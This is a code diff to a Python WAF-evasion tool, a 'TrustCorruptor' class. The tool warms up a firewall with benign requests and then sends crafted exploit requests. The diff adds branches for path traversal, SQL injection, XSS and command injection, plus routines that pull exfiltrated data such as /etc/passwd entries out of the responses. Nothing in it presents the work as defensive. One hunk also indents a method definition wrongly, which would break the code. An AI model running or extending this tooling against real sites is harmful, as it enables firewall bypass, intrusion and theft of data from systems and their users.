@@ -367,7 +367,7 @@ class TrustCorruptor:
         self.synthesis = NeuralExploitSynthesis(waf_vendor=waf_vendor)
         self.profile = WAF_PROFILES.get(waf_vendor or "", None)
 
-    async def corrupt(
+        async def corrupt(
         self,
         payload: str,
         max_benign_requests: int = 20,
@@ -391,6 +391,7 @@ class TrustCorruptor:
             "waf_vendor": self.waf_vendor or "Unknown",
             "trust_curve": None,
             "injection_result": None,
+            "exfiltrated_data": None,
             "tactical_profile": None,
             "poc_code": None,
             "steps_to_reproduce": [],
@@ -429,11 +430,9 @@ class TrustCorruptor:
             )
             results["trust_curve"] = trust_curve
 
-            # Step 4: Inject payload at peak trust
-            logger.info("injecting_payload_at_peak_trust")
+            # Step 4: Build trust with benign requests
+            logger.info("building_trust")
             injection_point = trust_curve.recommended_injection_point
-            
-            # Send benign requests up to injection point
             benign_headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                 "Accept": "text/html,application/xhtml+xml",
@@ -444,18 +443,25 @@ class TrustCorruptor:
                 await client.probe(self.target, headers=benign_headers)
                 await asyncio.sleep(0.2)
 
-            # Inject the payload
-            payload_headers = {
-                **benign_headers,
-                "X-Custom": delivery_payload[:100],
-            }
-
-            _, response = await client.probe(
-                self.target,
-                method="POST",
-                headers={"Content-Type": "application/x-www-form-urlencoded"},
-                body=f"input={delivery_payload}".encode(),
+            # Step 5: DETECT ATTACK TYPE AND CRAFT THE REAL EXPLOIT
+            attack_type = self._detect_attack_type(delivery_payload)
+            logger.info("crafting_exploit", attack_type=attack_type)
+            
+            exploit_request = self._craft_exploit_request(
+                delivery_payload, attack_type, benign_headers
             )
+
+            # Step 6: INJECT THE REAL EXPLOIT
+            logger.info("injecting_exploit_payload")
+            _, response = await client.probe(
+                exploit_request["url"],
+                method=exploit_request["method"],
+                headers=exploit_request["headers"],
+                body=exploit_request.get("body"),
+            )
+
+            # Step 7: EXTRACT EXFILTRATED DATA
+            exfiltrated = self._extract_data(response.body_text, attack_type, delivery_payload)
 
             injection_result = {
                 "status_code": response.status_code,
@@ -464,10 +470,14 @@ class TrustCorruptor:
                 "trust_score_at_injection": trust_curve.peak_trust_score,
                 "bypass_successful": response.status_code not in [403, 406, 429, 503],
                 "injection_point": injection_point,
+                "attack_type": attack_type,
+                "response_body": response.body_text[:2000],
+                "response_headers": dict(response.headers),
             }
             results["injection_result"] = injection_result
+            results["exfiltrated_data"] = exfiltrated
 
-        # Step 5: Generate tactical intel
+        # Step 8: Generate tactical intel
         results["tactical_profile"] = self._get_tactical_profile()
         results["steps_to_reproduce"] = self._generate_steps(results)
         results["advantages"] = self._get_advantages()
@@ -477,9 +487,100 @@ class TrustCorruptor:
 
         logger.info("trust_corruption_complete",
                    bypass=injection_result["bypass_successful"],
-                   trust_score=f"{trust_curve.peak_trust_score:.2f}")
+                   attack_type=attack_type,
+                   data_exfiltrated=len(exfiltrated) if exfiltrated else 0)
 
         return results
+
+    def _detect_attack_type(self, payload: str) -> str:
+        """Detect what kind of attack this payload represents."""
+        if re.search(r"\.\.\/|\.\.\\|/etc/|/passwd|/shadow|win\.ini", payload, re.IGNORECASE):
+            return "path_traversal"
+        elif re.search(r"SELECT|UNION|FROM|information_schema|@@version", payload, re.IGNORECASE):
+            return "sql_injection"
+        elif re.search(r"<script|alert\(|onerror|onload|javascript:", payload, re.IGNORECASE):
+            return "xss"
+        elif re.search(r"cat |ls |id|whoami|uname|wget|curl|/bin/", payload, re.IGNORECASE):
+            return "command_injection"
+        elif re.search(r"\{\{|\{%|ssti|template", payload, re.IGNORECASE):
+            return "ssti"
+        else:
+            return "generic"
+
+    def _craft_exploit_request(
+        self, payload: str, attack_type: str, base_headers: Dict[str, str]
+    ) -> Dict[str, Any]:
+        """Craft the actual exploit request based on attack type."""
+        
+        if attack_type == "path_traversal":
+            path_match = re.search(r"(\.\.\/[^\s]+|\.\.\\[^\s]+|/[a-z]+/[a-z]+/[^\s]+)", payload)
+            traversal_path = path_match.group(1) if path_match else payload
+            return {
+                "url": f"{self.target.rstrip('/')}/{traversal_path}",
+                "method": "GET",
+                "headers": base_headers,
+            }
+        
+        elif attack_type == "sql_injection":
+            encoded_payload = payload.replace(" ", "+").replace("'", "%27")
+            return {
+                "url": f"{self.target.rstrip('/')}?id={encoded_payload}",
+                "method": "GET",
+                "headers": {**base_headers, "Content-Type": "application/x-www-form-urlencoded"},
+            }
+        
+        elif attack_type == "xss":
+            return {
+                "url": self.target,
+                "method": "POST",
+                "headers": {**base_headers, "Content-Type": "application/x-www-form-urlencoded"},
+                "body": f"input={payload}".encode(),
+            }
+        
+        elif attack_type == "command_injection":
+            return {
+                "url": f"{self.target.rstrip('/')}?cmd={payload}",
+                "method": "GET",
+                "headers": base_headers,
+            }
+        
+        else:
+            return {
+                "url": self.target,
+                "method": "POST",
+                "headers": {**base_headers, "Content-Type": "application/x-www-form-urlencoded"},
+                "body": f"payload={payload}".encode(),
+            }
+
+    def _extract_data(self, response_body: str, attack_type: str, payload: str) -> Optional[str]:
+        """Extract meaningful data from the response based on attack type."""
+        if not response_body:
+            return None
+
+        if attack_type == "path_traversal":
+            if "root:" in response_body or "daemon:" in response_body:
+                lines = response_body.split("\n")
+                user_lines = [l for l in lines if ":" in l and len(l) < 200]
+                return "\n".join(user_lines[:20])
+            elif len(response_body) > 100:
+                return response_body[:2000]
+            return response_body[:500]
+
+        elif attack_type == "sql_injection":
+            if "column" in response_body.lower() or "table" in response_body.lower():
+                return response_body[:2000]
+            return response_body[:500]
+
+        elif attack_type == "command_injection":
+            return response_body[:2000]
+
+        elif attack_type == "xss":
+            if "alert" in response_body.lower() or payload[:10] in response_body:
+                return "XSS PAYLOAD REFLECTED IN RESPONSE\n" + response_body[:500]
+            return response_body[:500]
+
+        else:
+            return response_body[:1000] if len(response_body) > 50 else response_body
 
     def _get_tactical_profile(self) -> Dict[str, Any]:
         """Get tactical profile for the WAF."""
